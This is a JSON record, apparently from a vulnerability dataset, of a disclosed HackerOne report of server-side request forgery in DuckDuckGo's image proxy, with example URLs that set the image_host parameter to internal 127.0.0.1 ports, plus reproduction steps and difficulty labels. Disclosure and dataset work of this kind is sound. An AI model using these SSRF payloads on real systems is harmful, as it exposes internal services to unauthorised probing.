@@ -1,0 +1,38 @@
+{
+    "reported_to": "DuckDuckGo",
+    "reported_by": "fpatrik ",
+    "title": "SSRF in proxy.duckduckgo.com via the image_host parameter",
+    "content": "\nDescription\nhttps://proxy.duckduckgo.com/iur/ endpoint is vulnerable to ssrf via image_host\nget parameter.\nVulnerable URL:\nhttps://proxy.duckduckgo.com/iur/?f=1&image_host=https://tudomanyok.hu/\nSome internal URL:\nhttps://proxy.duckduckgo.com/iur/?f=1&image_host=https://127.0.0.1:18091/\nhttp://127.0.0.1:9998/\nhttp://127.0.0.1:8092/\nhttp://127.0.0.1:8091/\nThe only restriction that is there must be a http:// or https:// before the URL so you can't go with ssh://\nHow to reporduce\nGo to one of the internal urls and you will see that there is something (some url is only visible with view-source)\nThe best example is the http://127.0.0.1:18091/ one if you will visit: view-source:https://proxy.duckduckgo.com/iur/?f=1&image_host=https://127.0.0.1:18091/ui/ that there is something called couchebase console. (only visible in view-source)\nThese are I think internal web ports because I wasn't able to go to these ports from the external proxy.duckduckgo.com url.\nImpact\nAttacker can scan your internal network, finding internal port, and internal web applications\nThe hacker selected the Server-Side Request Forgery (SSRF) weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\nCan internal services be reached bypassing network access control?\nYes\nWhat internal services were accessible?\nhttp://127.0.0.1:9998/\nhttp://127.0.0.1:8092/\nhttp://127.0.0.1:8091/\nhttps://127.0.0.1:18091/\n...\nSecurity Impact\nI was possible to reach internal services, however I didn't tested that is that important or not (because i didn't want to violate any law)\n\n",
+    "severity": [
+        7.5,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Server-Side Request Forgery (SSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1534358760,
+    "report_url": "https://hackerone.com/reports/358119",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Navigate to the vulnerable URL: https://proxy.duckduckgo.com/iur/?f=1&image_host=https://127.0.0.1:18091/"
+        ],
+        [
+            2,
+            "View the page source to observe internal services or content not normally accessible externally"
+        ]
+    ],
+    "vuln_description": "The vulnerability is a Server-Side Request Forgery (SSRF) in the proxy.duckduckgo.com service, specifically in the /iur/ endpoint via the image_host parameter. This allows an attacker to make requests to internal services from the server's perspective, potentially accessing sensitive internal web applications and ports.",
+    "reason": "The attack involves a straightforward manipulation of the image_host parameter to point to internal URLs. There are no complex interactions or state manipulations required, and the vulnerability is a common type (SSRF) with a typical exploitation pattern.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
